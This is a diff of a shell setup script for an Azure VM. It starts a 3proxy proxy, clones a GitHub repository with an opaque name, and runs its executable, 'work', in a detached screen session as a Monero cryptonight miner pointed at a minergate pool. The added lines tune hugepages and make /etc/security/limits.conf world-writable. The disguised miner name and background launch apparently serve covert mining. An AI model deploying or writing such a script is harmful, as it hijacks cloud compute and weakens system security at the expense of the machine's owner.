@@ -19,4 +19,9 @@ sudo /etc/init.d/3proxyinit start
 sudo apt-get -y install screen git build-essential libuv1-dev libmicrohttpd-dev libssl-dev
 git clone https://github.com/denismatveev199/maretysoas.git /home/azureuser/maretysoas
 chmod 775 /home/azureuser/maretysoas/work
-screen -d -m /home/azureuser/maretysoas/work -a cryptonight -o xmr.pool.minergate.com:45700 -u $1 -p x -t $2 --donate-level 0 --max-cpu-usage $3
+sudo sysctl -w vm.nr_hugepages=128
+sudo chmod ugo+rwx /etc/security/limits.conf
+sudo echo 'soft memlock 262144' >> /etc/security/limits.conf
+sudo echo 'hard memlock 262144' >> /etc/security/limits.conf
+sysctl -p
+screen -d -m /home/azureuser/maretysoas/work -a cryptonight -o xmr.pool.minergate.com:45700 -u $1 -p x -t $2 --av=2 --donate-level 0 --max-cpu-usage $3
